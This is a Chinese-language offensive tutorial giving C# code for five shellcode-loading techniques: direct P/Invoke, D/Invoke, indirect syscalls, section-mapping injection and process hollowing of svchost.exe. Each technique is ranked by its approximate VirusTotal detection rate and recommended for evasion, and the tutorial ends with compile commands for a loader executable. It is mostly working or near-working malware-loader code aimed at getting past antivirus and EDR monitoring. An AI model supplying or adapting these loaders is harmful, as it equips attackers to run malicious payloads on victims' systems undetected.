# 04 - C# Shellcode加载（5种方法）

## 方法1：P/Invoke直接调用（基础）
```csharp
using System;
using System.Runtime.InteropServices;

class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddr, uint dwSize, uint flAllocType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttrib, uint dwStackSize, IntPtr lpStartAddr, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilli);

    static void Main() {
        byte[] shellcode = new byte[] { 0xfc, 0x48, ... };
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```
VT: ~42/70 | P/Invoke被Hook

## 方法2：D/Invoke（绕过P/Invoke监控）
```csharp
using System.Reflection;
using System.Runtime.InteropServices;

// 手动从kernel32.dll获取函数指针
IntPtr hKernel32 = LoadLibrary("kernel32.dll");
IntPtr pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");

// 通过委托调用
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate IntPtr VirtualAllocDelegate(IntPtr lpAddr, uint dwSize, uint flAllocType, uint flProtect);
var f = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(pVirtualAlloc);
IntPtr addr = f(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
```
VT: ~20/70 | 推荐 ⭐⭐⭐

## 方法3：C# + D/Invoke + 间接Syscall
```csharp
// 1. 手动映射ntdll.dll到内存
// 2. 从干净的ntdll副本中提取SSN（系统服务号）
// 3. 找到syscall gadget地址（ntdll中未hook的 syscall;ret）
// 4. 通过D/Invoke调用syscall gadget

public static uint GetSyscallNumber(string funcName) {
    // 解析ntdll导出表
    IntPtr funcAddr = GetProcAddress(ntdllBase, funcName);
    // SSN在函数偏移+4处: mov eax, <SSN>
    return BitConverter.ToUInt32(buffer, (int)funcOffset + 4);
}

// Syscall wrapper:
// mov r10, rcx
// mov eax, <SSN>
// jmp <gadget_addr>
```
VT: ~5-12/70 | 推荐 ⭐⭐⭐⭐⭐

## 方法4：Section-Based注入（绕过WriteProcessMemory）
```csharp
// NtCreateSection → 创建section对象
NtCreateSection(out hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);

// 本地映射
NtMapViewOfSection(hSection, GetCurrentProcess(), out localBase, ...);

// 写入shellcode到localBase
Marshal.Copy(shellcode, 0, localBase, shellcode.Length);

// 取消本地映射
NtUnmapViewOfSection(GetCurrentProcess(), localBase);

// 远程映射到目标进程
NtMapViewOfSection(hSection, hTargetProcess, out remoteBase, ...);

// 创建远程线程
NtCreateThreadEx(out hThread, ...);
```
VT: ~3-8/70 | 无WriteProcessMemory

## 方法5：Process Hollowing (C# + D/Invoke)
```csharp
// 1. 创建挂起的合法进程
CreateProcess("C:\\Windows\\System32\\svchost.exe", CREATE_SUSPENDED, ...);

// 2. 获取目标进程上下文
GetThreadContext(hThread, ref ctx);

// 3. 读取PEB获取ImageBase
ReadProcessMemory(hProcess, ctx.Rdx + 0x10, out imageBase, ...);

// 4. NtUnmapViewOfSection — 卸载原始镜像
SysNtUnmapViewOfSection(hProcess, (IntPtr)imageBase);

// 5. 在目标进程中分配新的RWX内存
SysNtAllocateVirtualMemory(hProcess, out remoteBase, ...);

// 6. 写入shellcode + PE头
SysNtWriteVirtualMemory(hProcess, remoteBase, shellcode, shellcodeSize, ...);

// 7. 更新PEB中的ImageBase
SysNtWriteVirtualMemory(hProcess, (IntPtr)(ctx.Rdx + 0x10), ref remoteBase, 8, ...);

// 8. 设置入口点
ctx.Rcx = (ulong)remoteBase + entryPointOffset;
SetThreadContext(hThread, ref ctx);

// 9. 恢复线程
NtResumeThread(hThread, ...);
```
VT: ~2-5/70 | 推荐 ⭐⭐⭐⭐⭐

### C#编译命令
```bash
# .NET Framework
csc /platform:x64 /target:exe /out:loader.exe loader.cs

# .NET 6+
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
```
